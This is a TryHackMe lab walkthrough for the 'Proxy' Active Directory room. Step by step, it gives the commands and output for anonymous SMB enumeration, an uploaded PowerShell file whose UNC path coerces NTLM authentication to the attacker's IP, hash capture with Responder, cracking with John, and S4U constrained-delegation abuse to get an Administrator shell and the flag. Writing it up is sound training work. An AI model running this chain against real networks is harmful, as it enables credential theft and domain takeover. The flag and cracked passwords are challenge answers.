# Proxy

TryHackMe – Proxy | Complete Walkthrough  
Platform: TryHackMe  
Room: Proxy  
Objective: Use your AD knowledge to exploit a careless service account and own the Domain Controller.

---

## 1. Getting Started

Start the Proxy room on TryHackMe and wait for the target machine to become available.

Connect your Kali Linux machine to the TryHackMe VPN using your downloaded OpenVPN configuration file.

```
sudo openvpn <your-tryhackme-vpn-file>.ovpn
```

Keep the VPN connection running.

Open another Kali terminal and create a working directory:

```
mkdir -p ~/TryHackMe/proxy
cd ~/TryHackMe/proxy
```

Copy the target IP address displayed by TryHackMe.

For this walkthrough, the target IP is:

```
10.67.139.235
```

Save the IP address:

```
echo "10.67.139.235" > target.txt
```

Set an environment variable so you can use `$ip` instead of repeatedly typing the target IP:

```
echo "export ip=10.67.139.235" >> ~/.zshrc
source ~/.zshrc
```

Verify the IP:

```
echo $ip
```

You should see:

```
10.67.139.235
```

**Important:** Replace the example IP address with the address assigned to your own TryHackMe machine.

## 2. Reconnaissance – Nmap Scan

Start by identifying the open ports and services running on the target.

Run an Nmap scan:

```
sudo nmap -sC -sS $ip -oN nmapScan.txt
```

The scan identifies several important services, including:

- DNS – 53
    
- Kerberos – 88
    
- MSRPC – 135
    
- NetBIOS – 139
    
- LDAP – 389
    
- SMB – 445
    
- Kerberos Password Change – 464
    
- LDAPS – 636
    
- Global Catalog LDAP – 3268
    
- Global Catalog LDAPS – 3269
    
- RDP – 3389
    

The results indicate that the target is a Windows Active Directory environment.

The Nmap output also identifies the domain:

```
ctf.local
```

And the Domain Controller:

```
DC01.ctf.local
```

## 3. SMB Enumeration

Enumerate the available SMB shares without providing credentials.

```
smbclient -L //$ip -N
```

The target exposes several shares:

```
ADMIN$
C$
IPC$
IT-Shared
NETLOGON
SYSVOL
```

The `IT-Shared` share is accessible without authentication.

Connect to it:

```
smbclient //$ip/IT-Shared -N
```

List the available files:

```
ls
```

You should find:

```
IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt
IT-Portal.html
```

Download these files:

```
get IT-Credentials-Backup.txt
get IT-Onboarding-Checklist.txt
get IT-Portal.html
```

Exit the SMB session:

```
exit
```

## 4. Reviewing the Retrieved Files

Read the credential backup file:

```
cat IT-Credentials-Backup.txt
```

The file contains archived credentials for two accounts:

```
helpdesk.bob : Welcome123!
it.admin     : ITAdmin2019!
```

However, both accounts are marked as disabled.

Next, inspect the onboarding checklist:

```
cat IT-Onboarding-Checklist.txt
```

Pay attention to the Automated Services section.

It reveals an important detail:

**File Scanner (svc.scanner)**

- Runs every two minutes.
    
- Enumerates the `IT-Shared` share for new files.
    
- Uses Shell enumeration to inspect file metadata and icons.
    

This identifies `svc.scanner` as an active service account and provides a potential way to capture its authentication hash.

Open the downloaded IT portal in your browser to review the available information:

```
firefox IT-Portal.html
```

Notice that the portal is logged in as `svc.scanner`. The dashboard also identifies `DC01.ctf.local` as the host for Active Directory, DNS, and the IT file share.

This tells us that DC01 is handling these important domain services. Keep this hostname in mind for further enumeration.

## 5. Triggering NTLM Authentication

First, identify the VPN interface and the local VPN IP address used to reach the target:

```
ip route get "$ip"
```

The output identifies the source IP address associated with the VPN connection.

For this walkthrough, the Kali VPN IP is:

```
192.168.136.24
```

Create a PowerShell script:

```
nano trigger.ps1
```

Add the following line:

```
Test-Path \\192.168.136.24\icons\icon.ico
```

Save and exit Nano.

Verify the script:

```
cat trigger.ps1
```

Connect to the `IT-Shared` SMB share:

```
smbclient //$ip/IT-Shared -N
```

Upload the PowerShell script:

```
put trigger.ps1
```

Verify that the file has been uploaded:

```
ls
```

Exit the SMB session:

```
exit
```

The file scanner periodically examines new files in the share. The script references a remote UNC path, causing the Windows system to attempt authentication to the Kali VPN address when the relevant file inspection takes place.

**Note:** `trigger.ps1` is the file used in this successful attack path. `test.bat` is not required.

## 6. Capturing the NetNTLMv2 Hash

Start Responder on the Kali VPN interface:

```
sudo responder -I tun0 -v
```

Keep Responder running and wait for the target to access the uploaded file.

When the authentication request arrives, Responder captures the NetNTLMv2 challenge-response hash for:

```
CTF\svc.scanner
```

Copy the complete captured hash.

Open a new Kali terminal and create a hash file:

```
nano hash.txt
```

Paste the captured NetNTLMv2 hash into the file and save it.

Verify the file:

```
cat hash.txt
```

## 7. Cracking the NetNTLMv2 Hash

Use John the Ripper with the RockYou wordlist to crack the captured hash.

```
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

John successfully recovers the password:

```
1summerlove!
```

The credentials are:

```
Username: svc.scanner
Password: 1summerlove!
Domain:   ctf.local
```

## 8. Validating the Service Account Credentials

Use NetExec to verify the recovered credentials against the target's SMB service.

```
nxc smb "$ip" -u 'svc.scanner' -p '1summerlove!'
```

The output confirms successful authentication:

```
[+] ctf.local\svc.scanner:1summerlove!
```

The credentials are valid.

## 9. Enumerating Kerberos Delegation

Next, enumerate the domain's delegation configuration using Impacket.

```
impacket-findDelegation 'ctf.local/svc.scanner:1summerlove!' -dc-ip "$ip"
```

The output reveals:

```
AccountName   DelegationType
DC01$         Unconstrained
svc.scanner   Constrained w/ Protocol Transition
```

The important finding is that `svc.scanner` has **constrained delegation with protocol transition** to the following CIFS services:

```
cifs/DC01
cifs/DC01.ctf.local
```

This configuration can be abused through Kerberos S4U to impersonate another domain user when requesting access to an allowed service.

## 10. Exploiting Constrained Delegation – S4U

Use Impacket's `getST` to request a service ticket while impersonating the Administrator account.

```
impacket-getST -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip "$ip" 'ctf.local/svc.scanner:1summerlove!'
```

The successful output shows:

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

The Kerberos service ticket is saved locally as a `.ccache` file.

## 11. Configuring Kerberos Ticket Authentication

Set the `KRB5CCNAME` environment variable to the full path of the generated ticket.

```
export KRB5CCNAME="$(realpath 'Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache')"
```

Verify the variable:

```
echo "$KRB5CCNAME"
```

Check that the ticket file exists:

```
ls -l "$KRB5CCNAME"
```

List the available Kerberos tickets:

```
klist
```

You should see the Administrator principal and the CIFS service ticket:

```
Default principal: Administrator@ctf.local

Service principal:
cifs/DC01.ctf.local@CTF.LOCAL
```

## 12. Configure Domain Controller Name Resolution

Add the Domain Controller's hostname to Kali's `/etc/hosts` file.

Open the file:

```
sudo nano /etc/hosts
```

Add the following entry:

```
10.67.139.235 DC01.ctf.local DC01
```

Save and exit Nano.

Verify hostname resolution:

```
getent hosts DC01.ctf.local
```

The output should match the current target IP:

```
10.67.139.235 DC01.ctf.local DC01
```

## 13. Accessing the Domain Controller

Use Impacket's SMBExec with Kerberos authentication and the previously generated ticket.

```
impacket-smbexec -k -no-pass -dc-ip "$ip" 'ctf.local/Administrator@DC01.ctf.local'
```

A successful connection launches a semi-interactive Windows shell:

```
C:\Windows\system32>
```

You now have access through the impersonated Administrator Kerberos ticket.

## 14. Retrieving the Administrator Flag

Read the Administrator flag from the Desktop:

```
type C:\Users\Administrator\Desktop\flag.txt
```

The output is:

```
THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
```

**Administrator flag successfully retrieved.**

The TryHackMe room is completed.